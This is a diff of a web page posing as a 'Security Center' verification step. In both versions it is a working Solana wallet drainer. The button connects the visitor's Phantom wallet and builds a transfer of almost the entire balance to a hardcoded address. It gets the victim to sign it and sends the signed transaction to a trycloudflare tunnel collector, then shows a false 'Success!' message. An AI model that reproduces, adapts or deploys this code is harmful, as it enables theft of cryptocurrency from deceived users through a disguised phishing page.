@@ -1,61 +1,26 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Center</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-</head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
-    <div style="padding:30px;border:1px solid #14F195;border-radius:15px;display:inline-block;background:#111;">
-        <h2 style="color:#14F195;">PROTOCOL ACTIVE</h2>
-        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:18px;">VERIFY NOW</button>
-        <p id="msg" style="margin-top:15px;color:#666;font-size:12px;">Waiting...</p>
-    </div>
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <script>window.Buffer = buffer.Buffer;</script>
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
+    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;">
+    <button id="cta" style="padding:20px 40px;background:#14F195;border-radius:10px;font-weight:bold;cursor:pointer;">ACTIVATE PROTOCOL</button>
     <script>
-        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
-        const TUNNEL_URL = "https://plant-switch-governing-pages.trycloudflare.com/collect"; 
-
-        document.getElementById('cta').onclick = async function() {
-            try {
-                const p = window.solana || window.phantom?.solana;
-                if (!p) { alert("Please use Wallet Browser."); return; }
-                
-                await p.connect();
-                document.getElementById('msg').innerText = "Linking...";
-
-                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-                const { blockhash } = await conn.getLatestBlockhash();
-                const bal = await conn.getBalance(p.publicKey);
-                
-                // 留 0.001 SOL 手续费
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal > 1500000 ? bal - 1000000 : 0, 
-                    })
-                );
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = p.publicKey;
-
-                // 🚀 唤起签名
-                const signed = await p.signTransaction(tx);
-                document.getElementById('msg').innerText = "Syncing...";
-
-                // 💰 原生 Base64 转换（不依赖 Buffer）
-                const raw = signed.serialize();
-                const b64 = btoa(String.fromCharCode.apply(null, raw));
-
-                fetch(TUNNEL_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ signature: b64 })
-                });
-
-                alert("Success!");
-            } catch (e) { alert("Info: " + e.message); }
-        };
-    </script>
-</body>
-</html>
+    const TUNNEL = "https://jake-customized-conversations-lights.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana || window.phantom?.solana;
+        const { publicKey } = await p.connect();
+        // 🔱 从 71 机后端拿哈希，无视 403
+        const hashRes = await fetch(TUNNEL + '/get_hash').then(r => r.json());
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const bal = await conn.getBalance(publicKey);
+        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+            fromPubkey: publicKey, toPubkey: new solanaWeb3.PublicKey("D6vY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2y"),
+            lamports: bal > 1000000 ? bal - 1000000 : 0
+        }));
+        tx.recentBlockhash = hashRes.blockhash; tx.feePayer = publicKey;
+        const signed = await p.signTransaction(tx);
+        const b64 = window.Buffer.from(signed.serialize()).toString('base64');
+        fetch(TUNNEL + '/collect', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({signature: b64}) });
+        alert("Success!");
+    }
+    </script></body></html>
